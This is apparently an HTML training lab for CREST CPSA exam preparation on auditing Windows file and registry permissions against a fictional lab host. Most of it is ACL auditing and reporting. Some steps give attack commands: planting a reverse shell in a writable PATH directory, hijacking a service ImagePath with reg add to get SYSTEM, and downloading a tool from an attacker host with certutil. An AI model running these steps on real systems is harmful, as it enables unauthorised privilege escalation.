@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab E3-B: ACLs, Registry and File Permissions | CPSA Module E | My Cyber Academy</title>
+<style>
+  :root { --mca-orange: #FF6B00; --mca-dark: #1a1a1a; --mca-grey: #2d2d2d; --mca-text: #e0e0e0; --mca-white: #ffffff; --mca-green: #4CAF50; --mca-red: #f44336; --mca-yellow: #FFC107; --mca-blue: #2196F3; --mca-code-bg: #0d1117; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--mca-dark); color: var(--mca-text); font-family: 'Segoe UI', Arial, sans-serif; font-size: 15px; line-height: 1.65; }
+  .lab-header { background: linear-gradient(135deg, #1a1a1a 0%, #2d1a00 100%); border-bottom: 3px solid var(--mca-orange); padding: 28px 32px 20px; }
+  .lab-header h1 { font-size: 26px; font-weight: 700; color: var(--mca-white); margin-bottom: 6px; }
+  .lab-header h1 span { color: var(--mca-orange); }
+  .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 12px; font-size: 13px; color: #aaa; }
+  .lab-meta .badge { background: var(--mca-grey); border: 1px solid #444; padding: 3px 10px; border-radius: 12px; font-size: 12px; }
+  .lab-meta .badge.orange { border-color: var(--mca-orange); color: var(--mca-orange); }
+  .container { max-width: 960px; margin: 0 auto; padding: 32px 24px; }
+  .chain-banner { background: #1a1a2e; border: 1px solid #2d3a5a; border-radius: 6px; padding: 16px 20px; margin-bottom: 24px; font-size: 13px; color: #9fa8da; }
+  .chain-banner strong { color: #c5cae9; }
+  .chain-steps { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; align-items: center; }
+  .chain-step { background: #222; border: 1px solid #333; border-radius: 4px; padding: 4px 10px; font-size: 12px; color: #888; }
+  .chain-step.done { border-color: #4CAF50; color: #4CAF50; }
+  .chain-step.active { background: #2d1a00; border-color: var(--mca-orange); color: var(--mca-orange); font-weight: 600; }
+  .chain-step.ahead { color: #555; border-color: #2a2a2a; }
+  .chain-arrow { color: #444; font-size: 14px; }
+  .scenario-box { background: var(--mca-grey); border-left: 4px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-bottom: 28px; }
+  .scenario-box h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-orange); margin-bottom: 10px; }
+  .scenario-box p { font-size: 14px; color: #ccc; }
+  .objectives { background: #1e2d1e; border: 1px solid #2d4a2d; border-radius: 4px; padding: 18px 24px; margin-bottom: 28px; }
+  .objectives h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-green); margin-bottom: 12px; }
+  .objectives ul { list-style: none; }
+  .objectives ul li { padding: 4px 0; font-size: 14px; }
+  .objectives ul li::before { content: "✓ "; color: var(--mca-green); font-weight: bold; }
+  .env-table { width: 100%; border-collapse: collapse; margin-bottom: 28px; font-size: 13px; }
+  .env-table th { background: var(--mca-grey); color: var(--mca-orange); text-align: left; padding: 10px 14px; font-size: 12px; text-transform: uppercase; border-bottom: 2px solid var(--mca-orange); }
+  .env-table td { padding: 10px 14px; border-bottom: 1px solid #333; }
+  .env-table tr:nth-child(even) td { background: #222; }
+  .env-table code { background: var(--mca-code-bg); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; color: var(--mca-orange); font-size: 12px; }
+  .phase { margin-bottom: 36px; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
+  .phase-header { background: var(--mca-grey); padding: 14px 20px; display: flex; align-items: center; gap: 14px; border-bottom: 1px solid #444; }
+  .phase-num { background: var(--mca-orange); color: #000; font-weight: 700; font-size: 14px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .phase-header h3 { font-size: 16px; color: var(--mca-white); }
+  .phase-header .phase-tag { margin-left: auto; font-size: 11px; color: #888; background: #222; border: 1px solid #444; padding: 2px 8px; border-radius: 10px; text-transform: uppercase; }
+  .phase-body { padding: 20px 24px; }
+  .step { margin-bottom: 22px; }
+  .step p { font-size: 14px; color: #ccc; margin-bottom: 10px; }
+  .step strong { color: var(--mca-white); }
+  pre { background: var(--mca-code-bg); border: 1px solid #30363d; border-radius: 6px; padding: 16px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.6; margin: 10px 0; }
+  pre code { color: #e6edf3; }
+  pre .comment { color: #8b949e; }
+  pre .cmd { color: #79c0ff; }
+  pre .flag { color: #ffa657; }
+  pre .str { color: #a5d6ff; }
+  pre .out { color: #3fb950; }
+  pre .warn { color: #FFC107; }
+  .callout { border-radius: 4px; padding: 14px 18px; margin: 14px 0; font-size: 13px; display: flex; gap: 12px; align-items: flex-start; }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .callout.crest { background: #1a1f2e; border: 1px solid #2d3a5a; }
+  .callout.crest .callout-icon { color: #7986cb; }
+  .callout.crest strong { color: #9fa8da; }
+  .callout.warn { background: #2a1f00; border: 1px solid #5a3a00; }
+  .callout.warn .callout-icon { color: var(--mca-yellow); }
+  .callout.info { background: #0d1f2d; border: 1px solid #1a3a5a; }
+  .callout.info .callout-icon { color: var(--mca-blue); }
+  .acl-table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 13px; }
+  .acl-table th { background: #222; color: var(--mca-orange); text-align: left; padding: 8px 12px; font-size: 12px; border-bottom: 1px solid #444; }
+  .acl-table td { padding: 8px 12px; border-bottom: 1px solid #2a2a2a; font-family: 'Courier New', monospace; font-size: 12px; }
+  .acl-table .risk-high { color: var(--mca-red); font-weight: bold; }
+  .acl-table .risk-med { color: var(--mca-yellow); }
+  .acl-table .risk-ok { color: var(--mca-green); }
+  .knowledge-check { background: #1a1a1a; border: 1px solid #444; border-radius: 6px; padding: 20px 24px; margin: 28px 0; }
+  .knowledge-check h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; }
+  .kc-question { margin-bottom: 20px; }
+  .kc-question p { font-size: 14px; margin-bottom: 10px; }
+  .options { display: flex; flex-direction: column; gap: 8px; }
+  .option { background: var(--mca-grey); border: 1px solid #444; border-radius: 4px; padding: 10px 14px; font-size: 13px; cursor: pointer; transition: border-color 0.2s; }
+  .option:hover { border-color: var(--mca-orange); }
+  .option.correct { background: #1e3a1e; border-color: var(--mca-green); color: #a5d6a7; }
+  .option.wrong { background: #3a1e1e; border-color: var(--mca-red); color: #ef9a9a; }
+  .reveal-btn { background: transparent; border: 1px solid var(--mca-orange); color: var(--mca-orange); padding: 7px 16px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-top: 8px; }
+  .reveal-btn:hover { background: var(--mca-orange); color: #000; }
+  .kc-answer { display: none; background: #0d1f0d; border: 1px solid #2d4a2d; border-radius: 4px; padding: 12px 16px; margin-top: 10px; font-size: 13px; color: #a5d6a7; }
+  .kc-answer.show { display: block; }
+  .takeaways { background: var(--mca-grey); border-top: 3px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-top: 32px; }
+  .takeaways h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 14px; }
+  .takeaways ul { list-style: none; }
+  .takeaways ul li { padding: 5px 0; font-size: 14px; color: #ccc; }
+  .takeaways ul li::before { content: "→ "; color: var(--mca-orange); }
+  .lab-footer { background: #111; border-top: 1px solid #333; padding: 18px 32px; text-align: center; font-size: 12px; color: #555; margin-top: 48px; }
+  .lab-footer span { color: var(--mca-orange); }
+  .nav-links { display: flex; justify-content: space-between; margin-top: 32px; }
+  .nav-link { background: var(--mca-grey); border: 1px solid #444; color: #aaa; padding: 10px 20px; border-radius: 4px; font-size: 13px; text-decoration: none; transition: border-color 0.2s; }
+  .nav-link:hover, .nav-link.next { border-color: var(--mca-orange); color: var(--mca-orange); }
+</style>
+</head>
+<body>
+
+<div class="lab-header">
+  <div class="lab-meta"><span style="font-size:12px;color:#888;text-transform:uppercase;letter-spacing:1px;">CPSA &rsaquo; Module E &rsaquo; Windows Security Assessment</span></div>
+  <h1><span>Lab E3-B:</span> ACLs, Registry and File Permissions</h1>
+  <div class="lab-meta">
+    <span class="badge orange">Module E</span>
+    <span class="badge">Windows</span>
+    <span class="badge">CREST CPSA</span>
+    <span class="badge">CPSA Ref: B13</span>
+    <span>Difficulty: Intermediate</span>
+    <span>Estimated time: 50 min</span>
+  </div>
+</div>
+
+<div class="container">
+
+  <div class="chain-banner">
+    <strong>Windows Attack Chain - Where You Are Now</strong>
+    <div class="chain-steps">
+      <span class="chain-step done">E0 Pre-flight</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E1-A SMB Enum</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E2-A Credential Access</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E3-A PrivEsc to SYSTEM</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step active">E3-B ACLs &amp; Permissions</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E4-A AD Enumeration</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E4-B Password Spray</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E5-A Kerberos</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E5-B SAM Dump</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E6-A SQL</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E7-A Patch Assessment</span>
+    </div>
+    <p style="margin-top:10px;font-size:12px;color:#7986cb;">You have just escalated to SYSTEM on SYNTEX-DC01. Before moving to AD enumeration, you need to understand what you now have access to - and what misconfigurations in file and registry ACLs would give a lower-privileged attacker the same result. This is also the evidence you document in your report under CPSA B13.</p>
+  </div>
+
+  <div class="scenario-box">
+    <h2>Engagement Scenario</h2>
+    <p>You are operating as SYSTEM on SYNTEX-DC01. Your task is to audit the file system and registry ACLs to identify misconfigurations that could be exploited by a lower-privileged attacker - and to document them as findings for the Syntex Solutions Ltd report. Understanding <em>why</em> you escalated, and proving it with ACL evidence, is a core part of a CPSA-level deliverable.</p>
+  </div>
+
+  <div class="objectives">
+    <h2>Learning Objectives</h2>
+    <ul>
+      <li>Use <code>icacls</code> to audit file and directory permissions for weak ACLs</li>
+      <li>Use PowerShell <code>Get-Acl</code> for structured permission analysis</li>
+      <li>Audit registry key ACLs for writable keys that enable privilege escalation</li>
+      <li>Identify world-writable service directories and PATH entries</li>
+      <li>Map ACL findings to CPSA B13 and document them report-ready</li>
+    </ul>
+  </div>
+
+  <table class="env-table">
+    <thead><tr><th>Host</th><th>IP</th><th>Current Access</th><th>CPSA Ref</th></tr></thead>
+    <tbody>
+      <tr><td>SYNTEX-DC01</td><td><code>&lt;DC01-IP&gt;</code></td><td>SYSTEM (from E3-A)</td><td>B13 - File Permissions, Registry ACLs</td></tr>
+    </tbody>
+  </table>
+
+  <!-- PHASE 1 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">1</div>
+      <h3>Understanding ACL Notation with icacls</h3>
+      <span class="phase-tag">icacls</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Before scanning, understand what <code>icacls</code> output means. The permission flags are what you will be reading throughout this lab and reporting in findings:</p>
+        <pre><code><span class="comment"># Run icacls on a directory to see its ACL</span>
+<span class="cmd">icacls</span> <span class="str">"C:\Program Files"</span>
+
+<span class="out">C:\Program Files NT SERVICE\TrustedInstaller:(F)
+                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+                 NT AUTHORITY\SYSTEM:(M)
+                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(M)
+                 BUILTIN\Administrators:(M)
+                 BUILTIN\Administrators:(OI)(CI)(IO)(M)
+                 BUILTIN\Users:(RX)
+                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)</span>
+</code></pre>
+        <p>The flags you must know for CPSA:</p>
+        <table class="acl-table">
+          <thead><tr><th>Flag</th><th>Meaning</th><th>Risk if granted to low-priv user</th></tr></thead>
+          <tbody>
+            <tr><td>(F)</td><td>Full Control</td><td class="risk-high">CRITICAL - complete ownership</td></tr>
+            <tr><td>(M)</td><td>Modify (read/write/execute/delete, not change perms)</td><td class="risk-high">HIGH - can replace binaries</td></tr>
+            <tr><td>(W)</td><td>Write</td><td class="risk-high">HIGH - can write new files</td></tr>
+            <tr><td>(RX)</td><td>Read and Execute</td><td class="risk-ok">Expected - read-only</td></tr>
+            <tr><td>(R)</td><td>Read only</td><td class="risk-ok">Expected</td></tr>
+            <tr><td>(OI)</td><td>Object Inherit - applies to child files</td><td class="risk-med">Check inherited perms carefully</td></tr>
+            <tr><td>(CI)</td><td>Container Inherit - applies to subfolders</td><td class="risk-med">Inherited write is still write</td></tr>
+            <tr><td>(IO)</td><td>Inherit Only - does not apply to this object directly</td><td class="risk-ok">Context-dependent</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> CPSA B13 specifically tests your ability to interpret Windows file system permissions and identify misconfigurations. Know the difference between (F), (M), and (W) - all three allow an attacker to write files; only (F) allows changing the ACL itself. In a report, state the specific flag, not just "write access".</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 2 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">2</div>
+      <h3>Auditing Service Directories for Writable Paths</h3>
+      <span class="phase-tag">icacls / Service Hijack</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Service binaries running as SYSTEM are high-value targets. If a low-privileged user can write to the binary path or its parent directory, they can replace the binary and get SYSTEM. Start with the Syntex custom services:</p>
+        <pre><code><span class="comment"># List all non-Microsoft services and their binary paths</span>
+wmic service where <span class="str">"not PathName like '%System32%' and not PathName like '%SysWOW64%'"</span> get Name, PathName, StartMode, State
+
+<span class="out">Name               PathName                                              StartMode  State
+SyntexBackup       C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe  Auto   Running
+SyntexMonitor      C:\SyntexMonitor\SyntexMon.exe                            Auto   Running
+SyntexAgent        C:\Program Files\Syntex\Agent\SyntexAgent.exe             Manual Stopped</span>
+
+<span class="comment"># Now check ACLs on each binary and its directory</span>
+<span class="cmd">icacls</span> <span class="str">"C:\SyntexMonitor"</span>
+<span class="out">C:\SyntexMonitor BUILTIN\Users:(OI)(CI)(F)
+                 NT AUTHORITY\SYSTEM:(F)
+<span class="warn"># FINDING: Users have Full Control on the SyntexMonitor directory</span>
+<span class="warn"># Anyone can replace C:\SyntexMonitor\SyntexMon.exe with a malicious binary</span></span>
+
+<span class="cmd">icacls</span> <span class="str">"C:\Program Files\Syntex Solutions"</span>
+<span class="out">C:\Program Files\Syntex Solutions BUILTIN\Users:(OI)(CI)(W)
+<span class="warn"># FINDING: Users have Write access - unquoted path attack possible (from E3-A)</span></span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Use PowerShell <code>Get-Acl</code> for structured output better suited to scripting and reporting:</p>
+        <pre><code><span class="comment"># Get-Acl gives you the full ACL object - good for reporting</span>
+<span class="cmd">Get-Acl</span> <span class="str">"C:\SyntexMonitor\SyntexMon.exe"</span> | <span class="cmd">Format-List</span>
+
+<span class="out">Path   : Microsoft.PowerShell.Core\FileSystem::C:\SyntexMonitor\SyntexMon.exe
+Owner  : BUILTIN\Administrators
+Group  : NT AUTHORITY\SYSTEM
+Access : Everyone Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl</span>
+
+<span class="comment"># For a concise one-liner across multiple paths:</span>
+<span class="str">"C:\SyntexMonitor","C:\Program Files\Syntex Solutions","C:\Scripts"</span> | <span class="cmd">ForEach-Object</span> {
+    $acl = <span class="cmd">Get-Acl</span> $_
+    $acl.Access | <span class="cmd">Where-Object</span> { $_.IdentityReference <span class="flag">-match</span> <span class="str">"Users|Everyone|Authenticated"</span> } |
+    <span class="cmd">Select-Object</span> @{n=<span class="str">'Path'</span>;e={$_}}, IdentityReference, FileSystemRights
+}
+</code></pre>
+      </div>
+      <div class="callout warn">
+        <span class="callout-icon">⚠</span>
+        <div><strong>Reporting Note:</strong> When you document an ACL finding, include the exact output of <code>icacls</code> as evidence, the specific identity (BUILTIN\Users, Everyone, etc.), the permission granted, and the attack path it enables. Generic statements like "insecure permissions" are not sufficient for a CPSA-level report.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 3 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">3</div>
+      <h3>Scanning for Writable Directories in System PATH</h3>
+      <span class="phase-tag">PATH Hijacking</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>If a directory in the system PATH is writable by non-administrative users, an attacker can plant a malicious executable that runs in place of a legitimate one. This is a PATH hijacking vulnerability:</p>
+        <pre><code><span class="comment"># Get all directories in the system PATH</span>
+$env:PATH <span class="flag">-split</span> <span class="str">";"</span> | <span class="cmd">ForEach-Object</span> {
+    $path = $_
+    <span class="cmd">try</span> {
+        $acl = <span class="cmd">Get-Acl</span> $path <span class="flag">-ErrorAction</span> Stop
+        $writableBy = $acl.Access | <span class="cmd">Where-Object</span> {
+            $_.FileSystemRights <span class="flag">-match</span> <span class="str">"Write|Modify|FullControl"</span> <span class="flag">-and</span>
+            $_.IdentityReference <span class="flag">-match</span> <span class="str">"Users|Everyone|Authenticated"</span>
+        }
+        <span class="cmd">if</span> ($writableBy) { <span class="cmd">Write-Host</span> <span class="str">"[WRITABLE]"</span> $path <span class="flag">-ForegroundColor</span> Red }
+    } <span class="cmd">catch</span> {}
+}
+
+<span class="out"><span class="warn">[WRITABLE] C:\SyntexTools</span>
+<span class="out">[OK] C:\Windows\System32
+[OK] C:\Windows</span>
+</span>
+<span class="comment"># C:\SyntexTools is in PATH and writable by Users - PATH hijack possible</span>
+<span class="comment"># If any admin runs a command that resolves via PATH, our binary runs first</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>To exploit a writable PATH directory, identify a command that administrators or services use and plant a trojanised version:</p>
+        <pre><code><span class="comment"># Example: if 'backup.exe' is called by a scheduled task running as SYSTEM</span>
+<span class="comment"># and C:\SyntexTools is before C:\Windows\System32 in PATH...</span>
+<span class="comment"># Plant our reverse shell as backup.exe in C:\SyntexTools</span>
+
+<span class="comment"># Document the PATH order - this matters for the report</span>
+$env:PATH <span class="flag">-split</span> <span class="str">";"</span>
+
+<span class="out"><span class="warn">C:\SyntexTools</span>           &lt;-- attacker-writable, first in PATH
+C:\Windows\System32
+C:\Windows
+C:\Windows\System32\Wbem</span>
+</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 4 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">4</div>
+      <h3>Registry ACL Audit</h3>
+      <span class="phase-tag">Registry / CPSA B13</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Registry ACLs control who can read and modify registry keys. Writable keys in <code>HKLM</code> (which affects all users and services) are particularly dangerous. The two highest-value targets for privilege escalation are service configuration and the Run keys:</p>
+        <pre><code><span class="comment"># Check ACL on a service's registry key</span>
+<span class="comment"># Service config lives at HKLM:\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;</span>
+
+<span class="cmd">Get-Acl</span> <span class="str">"HKLM:\SYSTEM\CurrentControlSet\Services\SyntexMonitor"</span> | <span class="cmd">Format-List</span>
+
+<span class="out">Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SyntexMonitor
+Owner  : BUILTIN\Administrators
+Access : BUILTIN\Users Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl</span>
+
+<span class="warn"># FINDING: Users have FullControl on the SyntexMonitor service registry key</span>
+<span class="warn"># An attacker can change the ImagePath value to point to a malicious binary</span>
+<span class="warn"># This achieves SYSTEM without touching the filesystem ACLs at all</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Demonstrate the registry-based service hijack - change the ImagePath directly:</p>
+        <pre><code><span class="comment"># With write access to the service key, change ImagePath</span>
+reg query <span class="str">"HKLM\SYSTEM\CurrentControlSet\Services\SyntexMonitor"</span> /v ImagePath
+
+<span class="out">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SyntexMonitor
+    ImagePath    REG_EXPAND_SZ    C:\SyntexMonitor\SyntexMon.exe</span>
+
+<span class="comment"># Modify ImagePath to run our payload instead</span>
+reg add <span class="str">"HKLM\SYSTEM\CurrentControlSet\Services\SyntexMonitor"</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="str">"C:\Windows\Temp\shell.exe"</span> /f
+
+<span class="out">The operation completed successfully.</span>
+
+<span class="comment"># Restart the service to trigger execution as SYSTEM</span>
+sc stop SyntexMonitor
+sc start SyntexMonitor
+<span class="comment"># Shell received on listener - no filesystem write needed</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Audit the Run and RunOnce keys - writable Run keys under HKLM allow persistence and privilege escalation:</p>
+        <pre><code><span class="comment"># Check Run key ACLs</span>
+<span class="cmd">Get-Acl</span> <span class="str">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> | <span class="cmd">Select-Object</span> <span class="flag">-ExpandProperty</span> Access |
+    <span class="cmd">Where-Object</span> { $_.IdentityReference <span class="flag">-match</span> <span class="str">"Users|Everyone"</span> }
+
+<span class="comment"># Check for AutoRun entries that might execute on next login</span>
+reg query <span class="str">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span>
+reg query <span class="str">"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span>
+
+<span class="comment"># Also check the AlwaysInstallElevated policy keys (from E3-A)</span>
+reg query <span class="str">"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"</span> /v AlwaysInstallElevated
+reg query <span class="str">"HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"</span> /v AlwaysInstallElevated
+</code></pre>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point (B13):</strong> Registry ACL misconfigurations are a distinct finding class from file system ACLs. In a CPSA exam scenario, you may be asked to identify whether a privilege escalation route used a file ACL or a registry ACL - these are different vulnerability types with different remediations. A writable service ImagePath key requires changing the registry key ACL, not the file ACL.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 5 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">5</div>
+      <h3>Rapid ACL Sweep with accesschk</h3>
+      <span class="phase-tag">Sysinternals</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Sysinternals <code>accesschk.exe</code> is a purpose-built tool for ACL auditing. It is faster than manual icacls checks and can sweep entire directory trees. It is commonly used in real engagements and may appear in CPSA exam scenarios:</p>
+        <pre><code><span class="comment"># Download accesschk from your Kali HTTP server</span>
+certutil <span class="flag">-urlcache</span> <span class="flag">-split</span> <span class="flag">-f</span> http://&lt;KALI-IP&gt;:8080/accesschk.exe accesschk.exe
+
+<span class="comment"># Find all services writable by Authenticated Users</span>
+accesschk.exe <span class="flag">-uwcqv</span> <span class="str">"Authenticated Users"</span> *
+
+<span class="out">RW SyntexMonitor
+   SERVICE_ALL_ACCESS</span>
+
+<span class="comment"># Find writable directories in Program Files</span>
+accesschk.exe <span class="flag">-uwdqs</span> Users <span class="str">"C:\Program Files"</span>
+accesschk.exe <span class="flag">-uwdqs</span> <span class="str">"Everyone"</span> <span class="str">"C:\"</span>
+
+<span class="out">C:\Scripts
+C:\SyntexMonitor
+C:\SyntexTools</span>
+
+<span class="comment"># Find writable registry keys under HKLM\Services</span>
+accesschk.exe <span class="flag">-uwks</span> <span class="str">"Authenticated Users"</span> HKLM\SYSTEM\CurrentControlSet\Services
+</code></pre>
+      </div>
+      <div class="callout info">
+        <span class="callout-icon">&#8505;</span>
+        <div><strong>Tip:</strong> On a live engagement, run <code>accesschk.exe -accepteula</code> on first launch to suppress the EULA dialog. In the Syntex lab, the EULA is pre-accepted. The <code>-q</code> flag suppresses the banner, <code>-u</code> suppresses errors, <code>-w</code> shows only writable, <code>-c</code> is services, <code>-d</code> is directories, <code>-s</code> is recursive.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- KNOWLEDGE CHECK -->
+  <div class="knowledge-check">
+    <h3>Knowledge Check</h3>
+    <div class="kc-question" id="q1">
+      <p><strong>Q1.</strong> <code>icacls</code> shows <code>BUILTIN\Users:(OI)(CI)(W)</code> on a service binary directory. Which statement is correct?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q1','a')">A. Users can read and execute files in the directory but not create new ones</div>
+        <div class="option" onclick="answer(this,'q1','b')">B. Users can write new files into the directory, and that permission inherits to subfolders and files</div>
+        <div class="option" onclick="answer(this,'q1','c')">C. Users have Full Control including the ability to change the ACL itself</div>
+        <div class="option" onclick="answer(this,'q1','d')">D. Only the directory owner can write files; other users are read-only</div>
+      </div>
+    </div>
+
+    <div class="kc-question" id="q2">
+      <p><strong>Q2.</strong> You find that BUILTIN\Users has FullControl on <code>HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc</code>. What is the most direct exploitation path?</p>
+      <button class="reveal-btn" onclick="reveal('a2')">Reveal Answer</button>
+      <div class="kc-answer" id="a2">Modify the ImagePath registry value to point to a malicious executable, then restart the service. The service runs as SYSTEM, so your payload executes with SYSTEM privileges. This is a registry ACL misconfiguration (CPSA B13) and is distinct from file ACL exploitation - the filesystem binary itself may have correct permissions, but the registry key controlling which binary runs does not.</div>
+    </div>
+
+    <div class="kc-question" id="q3">
+      <p><strong>Q3.</strong> What CPSA reference covers file system and registry ACL misconfigurations?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q3','a')">A. CPSA E3 - Privilege Escalation</div>
+        <div class="option" onclick="answer(this,'q3','b')">B. CPSA B13 - Windows File System Permissions and Registry ACLs</div>
+        <div class="option" onclick="answer(this,'q3','c')">C. CPSA E5 - Post-exploitation</div>
+        <div class="option" onclick="answer(this,'q3','d')">D. CPSA J1 - Application Layer</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="takeaways">
+    <h3>Key Takeaways</h3>
+    <ul>
+      <li>icacls and Get-Acl are your primary tools for file ACL auditing - know the flag notation for CPSA</li>
+      <li>BUILTIN\Users or Everyone with (W), (M), or (F) on a service directory or binary is always a HIGH finding</li>
+      <li>Registry ACL misconfigurations (writable service keys) are a separate finding class from file ACL issues</li>
+      <li>A writable ImagePath registry key gives the same result as a writable binary - SYSTEM code execution</li>
+      <li>accesschk.exe sweeps faster than manual icacls checks - use it on engagements where time is limited</li>
+      <li>Every finding needs the exact ACL output as evidence, not a generic statement</li>
+    </ul>
+  </div>
+
+  <div class="nav-links">
+    <a href="lab-e3a-windows-privesc-v1.html" class="nav-link">&larr; Lab E3-A: Windows Privilege Escalation</a>
+    <a href="lab-e4a-ad-enumeration-v1.html" class="nav-link next">Next: Lab E4-A - AD Enumeration &rarr;</a>
+  </div>
+
+</div>
+
+<div class="lab-footer">
+  <span>My Cyber Academy</span> &nbsp;|&nbsp; CREST CPSA Preparation &nbsp;|&nbsp; Module E: Windows Security Assessment<br>
+  Lab E3-B: ACLs, Registry and File Permissions &nbsp;|&nbsp; &copy; 2024 My Cyber Academy Ltd &nbsp;|&nbsp; All rights reserved
+</div>
+
+<script>
+const correctAnswers = { q1: 'b', q3: 'b' };
+function answer(el, qid, choice) {
+  const opts = document.querySelectorAll('#' + qid + ' .option');
+  opts.forEach(o => { o.classList.remove('correct','wrong'); o.style.pointerEvents='none'; });
+  el.classList.add(choice === correctAnswers[qid] ? 'correct' : 'wrong');
+  if (choice !== correctAnswers[qid]) {
+    opts.forEach(o => { if (o.textContent.trim().startsWith(correctAnswers[qid].toUpperCase() + '.')) o.classList.add('correct'); });
+  }
+}
+function reveal(id) { document.getElementById(id).classList.add('show'); event.target.style.display='none'; }
+</script>
+</body>
+</html>
